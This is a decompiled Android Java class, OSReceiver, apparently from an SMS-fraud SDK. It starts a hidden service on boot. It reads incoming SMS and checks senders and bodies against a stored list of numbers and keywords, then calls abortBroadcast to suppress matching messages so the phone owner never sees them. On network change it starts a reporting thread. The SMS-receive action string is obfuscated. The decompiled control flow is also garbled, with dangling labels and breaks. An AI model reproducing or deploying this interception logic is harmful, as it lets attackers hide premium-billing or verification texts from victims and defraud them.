package com.yl.ml.ser;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.os.Bundle;
import android.telephony.SmsMessage;
import com.yl.codelib.utils.CacheFileUtil;
import com.yl.codelib.utils.HexUtil;
import com.yl.codelib.utils.LogUtil;
import com.yl.codelib.utils.NetWorkUtil;
import com.yl.codelib.utils.TextUtil;
import com.yl.ml.date.PBSmsDBH;
import com.yl.ml.date.SdkString;
import com.yl.ml.thread.GoOnFankuiThread;
import java.util.ArrayList;

public class OSReceiver
  extends BroadcastReceiver
{
  public static final String BOOT_ACTION = "android.intent.action.BOOT_COMPLETED";
  public static final String NETWORKCHANGE_ACTION = "android.net.conn.CONNECTIVITY_CHANGE";
  public static long starttime = 0L;
  
  public OSReceiver() {}
  
  private static ArrayList a(String paramString1, String paramString2, String paramString3, Context paramContext)
  {
    Object localObject = new PBSmsDBH(paramContext);
    paramContext = new ArrayList();
    localObject = ((PBSmsDBH)localObject).query("select * from pb_table", null);
    int i = ((Cursor)localObject).getColumnIndex(paramString1);
    int j = ((Cursor)localObject).getColumnIndex(paramString2);
    if (localObject != null) {}
    for (;;)
    {
      if (!((Cursor)localObject).moveToNext())
      {
        ((Cursor)localObject).close();
        return paramContext;
      }
      paramString1 = ((Cursor)localObject).getString(i);
      paramString2 = ((Cursor)localObject).getString(j);
      if ((TextUtil.notNull(paramString1)) && (paramString3.startsWith(paramString1))) {
        paramContext.add(paramString2);
      }
    }
  }
  
  public void onReceive(Context paramContext, Intent paramIntent)
  {
    Object localObject1;
    if (paramIntent != null)
    {
      localObject1 = paramIntent.getAction();
      if (TextUtil.notNull((String)localObject1))
      {
        if (!((String)localObject1).equals("android.intent.action.BOOT_COMPLETED")) {
          break label53;
        }
        paramIntent = new Intent(paramContext, SHService.class);
        paramIntent.setAction("com.yl.mp.ShService.init");
        paramContext.startService(paramIntent);
      }
    }
    label53:
    label143:
    label378:
    do
    {
      int i;
      String str;
      do
      {
        do
        {
          return;
          if (!((String)localObject1).equals(HexUtil.byte2String(SdkString.Byte_RECEIVED_ACTION))) {
            break;
          }
          localObject1 = CacheFileUtil.getString("SHSMS", paramContext);
        } while ((TextUtil.notNull((String)localObject1)) && (((String)localObject1).equals("NO")));
        LogUtil.v(localObject1 + "SMS_RECEIVED_ACTION");
        LogUtil.v("onReceive");
        paramIntent = (Object[])paramIntent.getExtras().get("pdus");
        localObject1 = new SmsMessage[paramIntent.length];
        i = 0;
        if (i >= paramIntent.length) {
          break;
        }
        localObject1[i] = SmsMessage.createFromPdu((byte[])paramIntent[i]);
        str = localObject1[i].getMessageBody();
        localObject2 = localObject1[i].getOriginatingAddress();
        LogUtil.v(str + "\n");
        LogUtil.v(localObject2 + "\n");
      } while ((!TextUtil.notNull(str)) || (!TextUtil.notNull((String)localObject2)));
      Object localObject2 = a("port", "keyone", (String)localObject2, paramContext);
      int j;
      if (((ArrayList)localObject2).size() > 0) {
        j = 0;
      }
      for (;;)
      {
        if (j >= ((ArrayList)localObject2).size())
        {
          i += 1;
          break label143;
          break;
        }
        Object localObject3 = (String)((ArrayList)localObject2).get(j);
        if (localObject3 != null)
        {
          localObject3 = ((String)localObject3).split("#");
          int k = 0;
          int n;
          for (int m = 0;; m = n)
          {
            if (k >= localObject3.length)
            {
              if (m != localObject3.length) {
                break label378;
              }
              LogUtil.v("暂停传递");
              abortBroadcast();
              break;
            }
            n = m;
            if (str.contains(localObject3[k])) {
              n = m + 1;
            }
            k += 1;
          }
        }
        j += 1;
      }
    } while ((!((String)localObject1).equals("android.net.conn.CONNECTIVITY_CHANGE")) || (NetWorkUtil.getNetWork(paramContext) == null));
    long l = System.currentTimeMillis();
    LogUtil.v(l);
    LogUtil.v(starttime);
    if ((starttime != 0L) && (l - starttime < 60000L))
    {
      LogUtil.v("timeout");
      return;
    }
    new Thread(new GoOnFankuiThread(paramContext)).start();
    starttime = System.currentTimeMillis();
    paramIntent = new Intent(paramContext, SHService.class);
    paramIntent.setAction("com.yl.mp.ShService.init");
    paramContext.startService(paramIntent);
  }
}
